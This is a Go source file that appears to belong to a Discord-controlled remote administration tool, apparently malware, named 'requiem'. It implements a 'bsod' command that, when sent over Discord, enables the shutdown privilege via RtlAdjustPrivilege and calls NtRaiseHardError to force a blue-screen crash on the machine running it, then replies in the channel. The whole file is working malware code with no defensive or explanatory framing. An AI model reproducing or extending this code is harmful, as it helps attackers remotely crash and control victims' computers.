package commands

import (
	"requiem/store"
	"unsafe"

	"github.com/bwmarrin/discordgo"
)

func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	var old int32
	var res uint32

	ret, _, _ := store.AdjustPrivilege.Call(
		uintptr(19),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to adjust privileges.", msg.Reference())
	}

	ret, _, _ = store.RaiseHardError.Call(
		uintptr(0xC000007B),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(6),
		uintptr(unsafe.Pointer(&res)),
	)

	if ret != 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to trigger crash.", msg.Reference())
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to crash.", msg.Reference())
}

func (*CrashCommand) Name() string {
	return "bsod"
}

func (*CrashCommand) Info() string {
	return "Triggers the blue screen of death."
}

type CrashCommand struct{}
